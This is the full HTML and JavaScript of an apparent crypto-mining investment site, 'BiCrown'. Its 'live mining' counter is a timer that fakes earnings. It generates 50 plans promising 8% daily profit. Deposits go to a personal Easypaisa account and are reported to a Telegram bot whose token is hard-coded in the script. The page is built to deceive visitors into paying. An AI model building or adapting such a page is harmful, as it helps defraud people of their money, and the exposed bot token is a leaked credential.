<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BiCrown | Elite Mining</title>
    <style>
        :root { --neon: #bc13fe; --dark: #080808; --card: #151515; --success: #00ff88; --gold: #ffcc00; }
        body { font-family: 'Inter', sans-serif; background: var(--dark); color: white; margin: 0; display: flex; }
        
        /* Sidebar */
        .sidebar { width: 260px; background: #000; height: 100vh; border-right: 1px solid #222; position: fixed; padding: 25px; }
        .sidebar h1 { font-size: 28px; color: var(--neon); text-shadow: 0 0 15px var(--neon); margin-bottom: 40px; }
        .nav-item { padding: 15px; color: #888; cursor: pointer; border-radius: 12px; margin-bottom: 10px; transition: 0.3s; display: flex; align-items: center; gap: 10px; }
        .nav-item:hover, .nav-item.active { background: #1a1a1a; color: white; border-left: 4px solid var(--neon); }

        /* Main Content */
        .main { margin-left: 290px; padding: 30px; width: 100%; }
        
        /* Dashboard VIP Cards */
        .hero-card { background: linear-gradient(135deg, #1a1a1a 0%, #000 100%); padding: 40px; border-radius: 30px; border: 1px solid #333; position: relative; overflow: hidden; margin-bottom: 30px; }
        .hero-card::before { content: ''; position: absolute; top: -50%; right: -20%; width: 300px; height: 300px; background: var(--neon); filter: blur(120px); opacity: 0.2; }
        
        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
        .stat-box { background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid #222; transition: 0.3s; }
        .stat-box:hover { border-color: var(--neon); transform: translateY(-5px); }
        .stat-box h4 { color: #888; margin: 0; font-size: 14px; text-transform: uppercase; }
        .stat-box h2 { margin: 10px 0 0; font-size: 24px; }

        /* Buttons */
        .btn-group { display: flex; gap: 15px; margin-top: 25px; }
        .btn { padding: 12px 25px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-main { background: var(--neon); color: white; box-shadow: 0 0 20px rgba(188, 19, 254, 0.4); }
        .btn-sec { background: transparent; border: 1px solid #444; color: white; }

        /* Mining Animation */
        .mining-bar { height: 4px; background: #222; width: 100%; border-radius: 10px; margin-top: 15px; overflow: hidden; }
        .mining-progress { height: 100%; background: var(--success); width: 45%; box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }
        
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
        
        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin-bottom: 15px; }
        
        @media (max-width: 768px) { .sidebar { display: none; } .main { margin-left: 0; padding: 15px; } }
    </style>
</head>
<body>

    <div class="sidebar">
        <h1>BiCrown</h1>
        <div class="nav-item active" onclick="showPage('dash')">📊 Dashboard</div>
        <div class="nav-item" onclick="showPage('plans')">⛏️ Mining Plans</div>
        <div class="nav-item" onclick="showPage('wallet')">💳 My Wallet</div>
        <div class="nav-item" onclick="location.reload()" style="color: #ff4444; margin-top: 100px;">🔓 Logout</div>
    </div>

    <div class="main">
        <div id="dash-page">
            <div class="hero-card">
                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                    <div>
                        <p style="color: #888; margin: 0;">Total Balance</p>
                        <h1 style="font-size: 55px; margin: 10px 0;">Rs <span id="main-bal">0.00</span></h1>
                    </div>
                    <div style="text-align: right;">
                        <span style="background: rgba(0,255,136,0.1); color: var(--success); padding: 5px 15px; border-radius: 20px; font-size: 12px;">● LIVE MINING</span>
                        <h3 id="live-coins" style="margin: 10px 0; color: var(--success); font-family: monospace;">$0.000000</h3>
                    </div>
                </div>
                <div class="mining-bar"><div class="mining-progress"></div></div>
                <div class="btn-group">
                    <button class="btn btn-main" onclick="showPage('wallet')">Deposit</button>
                    <button class="btn btn-sec" onclick="showPage('wallet')">Withdraw</button>
                </div>
            </div>

            <div class="stat-grid">
                <div class="stat-box">
                    <h4>Today's Earnings</h4>
                    <h2 style="color: var(--success);">+ Rs 0.00</h2>
                </div>
                <div class="stat-box">
                    <h4>Active Miners</h4>
                    <h2 id="active-miners">0</h2>
                </div>
                <div class="stat-box">
                    <h4>Team Members</h4>
                    <h2 id="team-count">0</h2>
                </div>
            </div>
        </div>

        <div id="wallet-page" style="display:none;">
            <div class="hero-card">
                <h2>Add Funds (Deposit)</h2>
                <p>Send payment to Easypaisa Account:</p>
                <div style="background: #000; padding: 20px; border-radius: 15px; border: 1px dashed var(--neon); margin: 20px 0;">
                    <p style="margin: 5px 0;"><strong>Number:</strong> 0312-3456789</p>
                    <p style="margin: 5px 0;"><strong>Name:</strong> Romi Shah</p>
                </div>
                <input type="number" id="d-amt" placeholder="Amount (Rs)">
                <input type="text" id="d-trx" placeholder="TRX ID (Transaction ID)">
                <button class="btn btn-main" style="width: 100%;" onclick="notify('Deposit')">Submit Payment</button>
            </div>
        </div>

        <div id="plans-page" style="display:none;">
            <h2 style="margin-bottom: 30px;">Premium Mining Tiers</h2>
            <div class="stat-grid" id="plan-container"></div>
        </div>
    </div>

    <script>
        // Tab System
        function showPage(p) {
            ['dash-page', 'wallet-page', 'plans-page'].forEach(id => document.getElementById(id).style.display = 'none');
            document.getElementById(p + '-page').style.display = 'block';
        }

        // Live Mining Animation
        let coin = 0;
        setInterval(() => {
            coin += 0.000012;
            document.getElementById('live-coins').innerText = "$" + coin.toFixed(6);
        }, 1000);

        // Generate 50+ Real Plans
        const pContainer = document.getElementById('plan-container');
        for (let i = 1; i <= 50; i++) {
            let price = 350 + (i * 500);
            let daily = Math.floor(price * 0.08);
            pContainer.innerHTML += `
                <div class="stat-box" style="text-align: center;">
                    <p style="color: var(--neon); font-weight: bold;">MINER v${i}</p>
                    <h2>Rs ${price.toLocaleString()}</h2>
                    <p style="color: var(--success); font-size: 14px; margin: 15px 0;">Daily Profit: Rs ${daily}</p>
                    <button class="btn btn-sec" style="width: 100%; font-size: 12px;" onclick="showPage('wallet')">Activate</button>
                </div>
            `;
        }

        // Telegram Notification
        function notify(type) {
            const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
            const chatId = "7005219148";
            const amt = document.getElementById('d-amt').value;
            const trx = document.getElementById('d-trx').value;

            if(!amt || !trx) { alert("Please fill all details!"); return; }

            const msg = `🚀 *NEW DEPOSIT REQUEST*%0A💰 Amount: Rs ${amt}%0A🆔 TRX: ${trx}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
            .then(() => alert("Request sent! Admin will approve in 30 mins."));
        }
    </script>
</body>
</html>
